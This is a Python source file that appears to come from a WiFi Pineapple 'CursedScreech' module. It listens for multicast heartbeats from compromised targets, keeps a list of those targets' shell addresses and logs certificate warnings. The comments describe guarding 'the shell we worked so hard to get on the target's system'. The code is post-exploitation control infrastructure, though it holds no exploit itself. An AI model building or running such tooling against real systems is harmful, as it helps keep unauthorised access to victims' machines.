import socket
import struct
import sys
from target import Target
import threading
import time

# Load settings from file and assign to vars
settingsFile = "/pineapple/modules/CursedScreech/includes/forest/settings"
MCAST_GROUP = IFACE = target_list = activity_log = ""
MCAST_PORT = hbInterval = 0
settings = {}
with open(settingsFile, "r") as sFile:
	for line in sFile:
		params = line.strip("\n").split("=")
		if params[0] == "target_list":
			target_list = params[1]
		elif params[0] == "activity_log":
			activity_log = params[1]
		elif params[0] == "mcast_group":
			MCAST_GROUP = params[1]
		elif params[0] == "mcast_port":
			MCAST_PORT = int(params[1])
		elif params[0] == "hb_interval":
			hbInterval = int(params[1])
		elif params[0] == "iface_ip":
			IFACE = params[1]
		else:
			pass
			
# Default to a heartbeat of 5 seconds
# if one has not been set in file
if hbInterval == 0:
	hbInterval = 5

# Function to determine if a target exists in the supplied list
def targetExists(tgt,l):
	for t in l:
		if tgt in t.addr:
			return True
	return False

def logActivity(msg):
        with open(activity_log, "a") as log:
                log.write(msg + "\n")

def writeTargets(targets):
	with open(target_list, 'w') as tlog:
		for target in targets:
			tlog.write(target.sockName() + "\n")

# Set up the receiver socket to listen for multicast messages
sck = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
sck.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sck.bind((MCAST_GROUP, MCAST_PORT))
sck.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, socket.inet_aton(MCAST_GROUP)+socket.inet_aton(IFACE))

# Import targets from file if any exist
targets = []
with open(target_list, 'r') as tList:
	for line in tList:
		targets.append(Target(line.split(":")[0], line.split(":")[1]))
	
def checkMissingTargets():
	while True:
		# Check if any targets are missing.  If they are remove them
		# from the target_list and writeTargets().
		# 'Missing' is indicated by not receiving a heartbeat from a target
		# within thrice the set heartbeat interval.
		global targets
		global hbInterval
		updateTargetList = False
		for t in targets:
			if t.isMissing(hbInterval * 3):
				targets.remove(t)
				updateTargetList = True
		
		if updateTargetList:
			writeTargets(targets)
			
# Set up a separate thread to constantly check if targets
# have missed multiple heartbeats.
threads = []
newThread = threading.Thread(target=checkMissingTargets)
threads.append(newThread)
newThread.start()

while True:
	print "Waiting for heartbeat..."
	try:
		msg = sck.recv(10240)
		ip = msg.split(":")[0]
		port = msg.split(":")[1]

		print "Received: " + msg

		# The heartbeat is sometimes used to send a message telling us
		# when an invalid cert was sent to the target. This can be a sign
		# of an attacker on the network attempting to access the shell
		# we worked so hard to get on the target's system.
		# We check for messages here and direct them to the proper log.
		# For brevity's sake ip will let us know if it's a message and
		# port will contain the contents of the message.
		if ip == "msg":
			logActivity("Multicast Message: " + port)
			continue

		# Check if the target currently exists in the target list
		# if not then append it and write the list back out to
		# target_list
		if targetExists(ip, targets):
			for i,t in enumerate(targets):
				if ip == t.addr:
					t.setPort(port)
					t.lastSeen = time.time()
					writeTargets(targets)
		else:
			targets.append(Target(ip, port))
			writeTargets(targets)

	except KeyboardInterrupt:
		sys.exit()
